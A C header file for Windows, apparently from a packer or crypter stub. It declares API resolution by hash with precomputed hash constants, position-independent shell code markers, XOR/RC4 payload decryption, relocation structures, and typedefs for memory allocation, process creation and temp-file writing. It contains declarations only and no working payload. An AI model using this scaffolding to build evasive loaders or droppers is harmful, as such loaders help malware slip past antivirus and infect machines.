#pragma once
#include <Windows.h>
#include "common.h"

#define NAKED __declspec(naked)
void START_SHELL();
void END_SHELL();

#define SIZE_SHELL ((uint32)END_SHELL-(uint32)START_SHELL+sizeof(SHELL_BLOCK))

#define RVATOVA(Base,Rva) ((DWORD)Base + (DWORD)Rva)
uint8 *get_base(uint8* base);
uint32 calc_hash(char *name);
uint32 calc_hash_upcase_w(short *name);
uint32 calc_hash_w(short *name);
LPVOID GetGetProcAddress(HMODULE Base,uint32 dwHashName);
HMODULE GetModuleHandle(uint32 hash);
uint32 delta();
char *upcase(char *name);
short *upcase_w(short *name);
void crypt(uint8* d,int size,uint32 key,uint8 type);
void _memcpy(uint8 *m1,uint8 *m2,int size);
DWORD _stdcall thread_main(LPVOID arg);
void _memset(uint8 *m1,uint8 ch,int size);

#pragma pack(push,1)

struct DECRYPT_ITEM{
	uint32 size;
	uint32 key;
};

struct SHELL_BLOCK{
	uint32 key;
	uint32 rva;
};

struct rc4_context{
    int x;
    int y;
    unsigned char m[256];
};
/*
enum CRYPT{
	_CIP_XOR = 0,
	_CIP_ADD = 1,
	_CIP_SUB = 2,
	_CIP_RC4 = 3,
	_CIP_TRASH =4,
};
*/

struct RELOCATION_DIRECTORY{
    uint32 VirtualAddress;
    uint32 SizeOfBlock;
};


#pragma pack(pop)

typedef BOOL (WINAPI *_tVirtualProtect)(LPVOID lpAddress,SIZE_T dwSize,DWORD flNewProtect,PDWORD lpflOldProtect);
typedef LPVOID (WINAPI *_tVirtualAlloc)(LPVOID lpAddress,SIZE_T dwSize,DWORD flAllocationType,DWORD flProtect);
typedef BOOL (WINAPI *_tVirtualFree)(LPVOID lpAddress,SIZE_T dwSize,DWORD dwFreeType);
typedef HANDLE (WINAPI *_tCreateThread)(LPSECURITY_ATTRIBUTES lpThreadAttributes,SIZE_T dwStackSize,LPTHREAD_START_ROUTINE lpStartAddress,LPVOID lpParameter,DWORD dwCreationFlags,LPDWORD lpThreadId);
typedef HANDLE (WINAPI *_tCreateMutexA)(LPSECURITY_ATTRIBUTES lpMutexAttributes,BOOL bInitialOwner,LPCSTR lpName);
typedef HANDLE (WINAPI *_tOpenMutexA)(DWORD dwDesiredAccess,BOOL bInheritHandle,LPCSTR lpName);
typedef VOID (WINAPI *_tExitProcess)(UINT uExitCode);
typedef HMODULE (WINAPI *_tLoadLibraryA)(LPCSTR lpLibFileName);
typedef FARPROC (WINAPI *_tGetProcAddress) (HMODULE hModule,LPCSTR lpProcName);
typedef int (WINAPI *_tMessageBoxA)(HWND hWnd, LPCSTR lpText, LPCSTR lpCaption, UINT uType);
typedef HANDLE (WINAPI *_tCreateFileA)(LPCSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);
typedef BOOL (WINAPI *_tWriteFile)(HANDLE hFile,LPCVOID lpBuffer,DWORD nNumberOfBytesToWrite,LPDWORD lpNumberOfBytesWritten,LPOVERLAPPED lpOverlapped);
typedef BOOL (WINAPI *_tCloseHandle)(HANDLE hObject);
typedef BOOL (WINAPI *_tCreateProcessA)(LPCSTR lpApplicationName,LPSTR lpCommandLine,LPSECURITY_ATTRIBUTES lpProcessAttributes,LPSECURITY_ATTRIBUTES lpThreadAttributes,BOOL bInheritHandles, DWORD dwCreationFlags, LPVOID lpEnvironment, LPCSTR lpCurrentDirectory, LPSTARTUPINFOA lpStartupInfo, LPPROCESS_INFORMATION lpProcessInformation);
typedef DWORD (WINAPI *_tSetFilePointer)(HANDLE hFile, LONG lDistanceToMove, PLONG lpDistanceToMoveHigh, DWORD dwMoveMethod);
typedef HMODULE (WINAPI *_tGetModuleHandleA)(LPCSTR lpModuleName);
typedef DWORD (WINAPI *_tGetTempPathA)(DWORD nBufferLength,LPSTR lpBuffer);
typedef UINT (WINAPI *_tGetTempFileNameA)(LPCSTR lpPathName, LPCSTR lpPrefixString, UINT uUnique, LPSTR lpTempFileName);


#define KERNEL32			0xE0F38342
#define	_hVirtualProtect	0x15f8ef80
#define	_hVirtualAlloc		0x19BC06C0
#define	_hVirtualFree		0xEA43A878
#define	_hCreateThread		0x15B87EA2
#define	_hCreateMutexA		0x69D46E82
#define	_hOpenMutexA		0x4994EF80
#define	_hExitProcess		0xD66358EC
#define	_hLoadLibraryA		0x71E40722
#define	_hGetProcAddress	0x5D7574B6
#define	_hCreateFileA		0x860B38BC
#define	_hWriteFile			0xF67B91BA
#define	_hCloseHandle		0xF867A91E
#define	_hCreateProcessA	0x5DBCE6F0
#define	_hSetFilePointer	0x7F3545C6
#define _hGetModuleHandleA	0x0F191CF4
#define _hGetTempPathA		0x2D5DFCB4
#define _hGetTempFileNameA	0x75ECF732

#define USER32				0xF4DBD3E2
#define	_hMessageBoxA		0xBE7B3098
